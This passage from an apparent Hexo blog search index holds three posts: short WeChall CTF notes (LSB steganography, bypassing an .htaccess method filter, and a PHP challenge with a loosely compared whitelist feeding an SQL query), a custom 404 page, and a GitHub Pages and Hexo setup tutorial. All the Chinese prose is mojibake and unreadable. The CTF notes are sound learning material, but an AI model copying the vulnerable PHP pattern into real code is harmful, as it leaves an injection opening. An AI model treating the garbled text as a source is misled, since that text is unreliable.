LSBæ”¾å…¥ç¥å™¨stegsolveä¸­ CBNMGNBFMOHN Limited Access Tooè®¿é—®.htaccesså‘ç°å‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰æ–¹æ³• GET POST HEAD PUT DELETE CONNECT OPTIONS phpä¼šå°†TOæ–¹æ³•ç»™è§£ææˆGETæ–¹æ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠ“åŒ…ï¼Œæ”¹ä¸ºTO ä½¿ç”¨moveæ–¹æ³• PHP 0815æºç å¦‚ä¸‹ï¼š &lt;? $whitelist = array(1, 2, 3); if (false === ($show = isset($_GET[&apos;show&apos;]) ? $_GET[&apos;show&apos;] : false)) { die(&apos;MISSING PARAMETER; USE foo.bar?show=[1-3]&apos;); } elseif (in_array($show, $whitelist)){ $query = &quot;SELECT 1 FROM `table` WHERE `id`=$show&quot;; echo &apos;Query: &apos;.htmlspecialchars($query, ENT_QUOTES).&apos;&lt;br/&gt;&apos;; die(&apos;SHOWING NUMBER &apos;.htmlspecialchars($show, ENT_QUOTES)); }else { die(&apos;HACKER NONONO&apos;); } è¿™æ˜æ˜¾æ˜¯SQLæ³¨å…¥ï¼Œä½†æ˜¯é˜²æ³¨å…¥çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œéœ€è¦æ‰¾åˆ°æœ€ç®€å•çš„ï¼Œäºæ˜¯æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ï¼š å°†ä¼ å…¥çš„å‚æ•°éœ€è¦è½¬æ¢æˆæ•´æ•°ã€‚ é€šå¸¸æ‰€ç”¨çš„å‡½æ•°æ˜¯int()æˆ–è€…intval() ç„¶è€Œå‡ºäºphp wtfçš„atoiè½¬æ¢è§„åˆ™ï¼Œ$show-0è¶³ä»¥å®Œæˆ htmlspecialcharsè¿™é¢˜æ˜¯xssï¼Œå€Ÿè¿™ä¸ªï¼Œå†å†™ä¸€ç¯‡xssçš„æ€»ç»“ã€‚]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ›å»º404é¡µé¢]]></title>
    <url>%2F2015%2F10%2F13%2F%E5%88%9B%E5%BB%BA404%E9%A1%B5%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[è‡ªå®šä¹‰é¡µé¢ä»¥404é¡µé¢ä¸ºä¾‹ æ‰§è¡Œå‘½ä»¤ $ hexo new page &quot;404&quot; INFO Created: D:\Hexo\Hexo\source\404\index-1.md ç¼–å†™ä»£ç å¦‚ä¸‹ï¼š title: 404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º comments: false permalink: /404 fancybox: false --- &lt;style type=&quot;text/css&quot;&gt; .article-title { font-size: 2.1em; } strong a { color: #747474; } .share { display: none; } .player { margin-left: -10px; } .sign { text-align: right; font-style: italic; } #page-visit { display: none; } .center { text-align: center; height: 2.5em; font-weight: bold; } .search2 { height: 2.2em; font-size: 1em; width: 50%; margin: auto 24%; color: #727272; opacity: .6; border: 2px solid lightgray; } .search2:hover { opacity: 1; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3) }; .article-entry hr { margin: 0; } .pic { text-align: center; margin: 0; } .pic br { display: none; } &lt;/style&gt; *** &lt;div class=&quot;pic&quot;&gt; &lt;img src=&quot;/img/404.jpg&quot; title=&quot;Mihawk-Wind&quot;&gt; &lt;/div&gt; &lt;p class=&quot;center&quot;&gt;å¾ˆæŠ±æ­‰ï¼Œæ‚¨æ‰€è®¿é—®çš„åœ°å€å¹¶ä¸å­˜åœ¨: &lt;/p&gt; &lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/&quot;&gt;å›ä¸»é¡µ&lt;/a&gt; Â· &lt;a href=&quot;/archives&quot;&gt;æ‰€æœ‰æ–‡ç« &lt;/a&gt; Â· &lt;a href=&quot;/about&quot;&gt;å…³äº&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;center&quot;&gt;å¯åœ¨è¾¹æ æœç´¢æ¡†ä¸­å¯¹æœ¬ç«™è¿›è¡Œæ£€ç´¢ï¼Œä»¥è·å–ç›¸å…³ä¿¡æ¯ã€‚&lt;/p&gt; &lt;div style=&quot;text-align: center&quot;&gt; ä»¥ä¸‹æ˜¯åšä¸»å–œæ¬¢çš„ä¸€äº›æ­Œæ›²ï¼Œå¯ä»¥å¬å¬ï¼Œç¨ä½œä¼‘æ¯~ &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=320 height=330 src=&quot;http://music.163.com/outchain/player?type=0&amp;id=112513213&amp;auto=0&amp;height=430&quot;&gt;&lt;/iframe&gt; &lt;/div&gt;]]></content>
      <tags>
        <tag>å‰ç«¯</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>åšå®¢</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Github+Hexoæ­å»ºç‹¬ç«‹åšå®¢]]></title>
    <url>%2F2015%2F09%2F13%2F%E4%BD%BF%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[åº”ç”¨GitHub Pagesåˆ›å»ºå±äºè‡ªå·±çš„ä¸ªäººåšå®¢ï¼ŒGitHubå°†æä¾›å…è´¹çš„ç©ºé—´ã€‚GitHubæä¾›çš„åŸŸåï¼ˆç”¨æˆ·å+github+ioï¼‰,åœ¨Repository nameå¯¹åº”å¤„å¡«å†™èµ„æºåï¼Œå…¶éœ€è¦ä½¿ç”¨è‡ªå·±çš„ç”¨æˆ·åï¼Œæ¯ä¸ªç”¨æˆ·åä¸‹é¢åªèƒ½å»ºç«‹ä¸€ä¸ªï¼Œå¹¶ä¸”èµ„æºå‘½åå¿…é¡»ç¬¦åˆè¿™æ ·çš„è§„åˆ™username/username.github.ioï¼Œä¹‹åå‹¾é€‰ä¸‹é¢çš„â€Initialize this repository with a READMEâ€ å®‰è£…å‡†å¤‡ç¯å¢ƒæ­å»ºï¼š Node.jsï¼šä¸‹è½½åœ°å€ Gitï¼šä¸‹è½½åœ°å€#GitHubæ³¨å†Œä¸é…ç½® æ³¨å†Œåœ°å€ å…·ä½“é…ç½®åŠä½¿ç”¨è¯·å‚ç…§ï¼šä½¿ç”¨Github Pagesæ­å»ºç‹¬ç«‹åšå®¢ é…ç½®å¹¶æ·»åŠ SSH KEYåˆ°Github æµ‹è¯• å¯ä»¥è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼Œçœ‹çœ‹è®¾ç½®æ˜¯å¦æˆåŠŸï¼Œgit@github.comçš„éƒ¨åˆ†ä¸è¦ä¿®æ”¹ï¼š $ ssh -T git@github.com å¦‚æœæ˜¯ä¸‹é¢çš„åé¦ˆï¼š The authenticity of host â€˜github.com (207.97.227.239)â€™ canâ€™t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? ä¸è¦ç´§å¼ ï¼Œè¾“å…¥yeså°±å¥½ï¼Œç„¶åä¼šçœ‹åˆ°ï¼š Hi cnfeat! Youâ€™ve successfully authenticated,but GitHub does not provide shell access. è®¾ç½®ç”¨æˆ·ä¿¡æ¯ï¼šç°åœ¨ä½ å·²ç»å¯ä»¥é€šè¿‡SSHé“¾æ¥åˆ°GitHubäº†ï¼Œè¿˜æœ‰ä¸€äº›ä¸ªäººä¿¡æ¯éœ€è¦å®Œå–„çš„ã€‚ Gitä¼šæ ¹æ®ç”¨æˆ·çš„åå­—å’Œé‚®ç®±æ¥è®°å½•æäº¤ã€‚ $ git config â€“global user.name â€œcnfeatâ€//ç”¨æˆ·å$ git config â€“global user.email â€œcnfeat@gmail.comâ€//å¡«å†™è‡ªå·±çš„é‚®ç®± SSH Keyé…ç½®æˆåŠŸï¼Œæœ¬æœºå·²æˆåŠŸè¿æ¥åˆ°github. HexoHexoæ˜¯ä¸€ä¸ªç®€å•ã€å¿«é€Ÿã€å¼ºå¤§çš„åšå®¢å‘å¸ƒå·¥å…·ï¼Œæ”¯æŒMarkdownæ ¼å¼ã€‚ å®‰è£…æ–°å»ºä¸€ä¸ªæ–‡æ¡£ å½“ä½œåšå®¢æ ¹ç›®å½•ï¼ˆå°½é‡ä¸è¦æœ‰ä¸­æ–‡ï¼‰ï¼Œåœ¨æ­¤ç›®å½•ä¸‹æ‰“å¼€Git Bashï¼ˆå‰æç¡®ä¿Node.jså·²ç»å®‰è£…ï¼Œç¯å¢ƒé…ç½®OKï¼‰ $ npm install -g hexo $ hexo init $ hexo generate $ hexo server æ‰“å¼€æœ¬åœ°http://localhost:4000/ä½ å°±å¯ä»¥çœ‹åˆ°hexoç½‘ç«™äº†ã€‚ æ³¨ï¼š hexo serverå¯åŠ¨ä¹‹åæ— æ³•è®¿é—®ï¼šä½¿ç”¨-på‚æ•°æ”¹ç«¯å£ npmå‘½ä»¤æ‰¾ä¸åˆ°ï¼šä½¿ç”¨npm.cmd,æˆ–è€…å¸è½½é‡è£… gitå‘½ä»¤æ‰¾ä¸åˆ°ï¼šgit initå…ˆåˆå§‹åŒ–éƒ¨ç½²åˆ°GitHubç¼–è¾‘hexoç›®å½•ä¸‹çš„_config.ymlï¼ˆæ­¤æ–‡ä»¶ä¸ºä½ ç½‘ç«™çš„é…ç½®æ–‡ä»¶) ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š123type: gitrepository: http://github.com/drops123456/drops123456.github.io.git branch: master ç„¶åæ‰§è¡Œï¼š hexo g ç¼–è¯‘ç”Ÿæˆé™æ€æ–‡ä»¶ hexo d å‘å¸ƒåˆ°Github è®¿é—®ï¼šhttp://username.github.io/å³å¯çœ‹åˆ°ç½‘ç«™ã€‚ å¦‚æœéœ€è¦ä½¿ç”¨åˆ«çš„åŸŸåï¼Œåœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶CNAMEå†…å®¹ä¸ºä½ çš„åŸŸåå³å¯ï¼ˆå…³äºAè®°å½•å’ŒCNAMEï¼Œè¯·å‚è€ƒï¼šåŸŸåè§£æçš„åŒºåˆ«ï¼‰ cloneä¸»é¢˜é€‰æ‹©ä¸€ä¸ªä¸»é¢˜ ä½¿ç”¨å‘½ä»¤ git clone http://example.com ä¸‹è½½zipåŒ… åœ¨æŠŠä¸‹è½½çš„ä¸»é¢˜æ‹·è´åˆ°hexo/themesç›®å½•ä¸‹ï¼Œé…ç½®_config.yml theme: yelee éƒ¨ç½²ä¸»é¢˜$ hexo g #ç”Ÿæˆ $ hexo s #å¯åŠ¨æœ¬åœ°æœåŠ¡ï¼Œè¿›è¡Œæ–‡ç« é¢„è§ˆè°ƒè¯• å®ä¾‹exampleä»¥æˆ‘çš„ç½‘ç«™çš„é…ç½®ï¼Œå¦‚ä¸‹ï¼š # Hexo Configuration ## Docs: https://hexo.io/docs/configuration.html ## Source: https://github.com/hexojs/hexo/ # Site title: Joy_nick subtitle: No pains, No gainsï¼ description: No pains, No gainsï¼ author: Joy_nick language: zh-CN timezone: # URL ## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos; url: http://byd.dropsec.xyz root: / permalink: :year/:month/:day/:title/ permalink_defaults: # Directory source_dir: source public_dir: public tag_dir: tags archive_dir: archives category_dir: categories code_dir: downloads/code i18n_dir: :lang skip_render: # Writing new_post_name: :title.md # File name of new posts default_layout: post titlecase: false # Transform title into titlecase external_link: true # Open external links in new tab filename_case: 0 render_drafts: false post_asset_folder: false relative_link: false future: true highlight: enable: true line_number: true auto_detect: false tab_replace: # Category &amp; Tag default_category: uncategorized category_map: tag_map: # Date / Time format ## Hexo uses Moment.js to parse and display date ## You can customize the date format as defined in ## http://momentjs.com/docs/#/displaying/format/ date_format: YYYY-MM-DD time_format: HH:mm:ss # Pagination ## Set per_page to 0 to disable pagination per_page: 8 pagination_dir: page # Extensions ## Plugins: https://hexo.io/plugins/ ## Themes: https://hexo.io/themes/ theme: yelee feed: #ä¹‹åé…ç½®rssä¼šç”¨ï¼Œä½¿ç”¨å¦‚ä¸‹é…ç½®å³å¯ type: atom path: atom.xml limit: 20 # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repository: http://github.com/drops123456/drops123456.github.io.git branch: master å‘å¸ƒæ–°çš„æ–‡ç«  cdåˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ $ hexo new â€œMy New Postâ€ [info] File created at d:\Hexo\source_posts\My-New-Post.md ç¼–è¯‘ç”Ÿæˆé™æ€æ–‡ä»¶ hexo g éƒ¨ç½²åˆ°Github hexo dä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼šhexo g -d æ³¨ï¼šå»ºè®®æ¯æ¬¡éƒ¨ç½²å‰ï¼Œå…ˆæœ¬åœ°æŸ¥çœ‹ å‘½ä»¤æ€»ç»“hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy hexo new &quot;postName&quot; #æ–°å»ºæ–‡ç«  hexo new page &quot;pageName&quot; #æ–°å»ºé¡µé¢ hexo generate #ç”Ÿæˆé™æ€é¡µé¢è‡³publicç›®å½• hexo server #å¼€å¯é¢„è§ˆè®¿é—®ç«¯å£ï¼ˆé»˜è®¤ç«¯å£4000ï¼Œ&apos;ctrl + c&apos;å…³é—­serverï¼‰ hexo deploy #å°†.deployç›®å½•éƒ¨ç½²åˆ°GitHub hexo help # æŸ¥çœ‹å¸®åŠ© hexo version #æŸ¥çœ‹Hexoçš„ç‰ˆæœ¬]]></content>
      <tags>
        <tag>åšå®¢</tag>
      </tags>
  </entry>
</search>
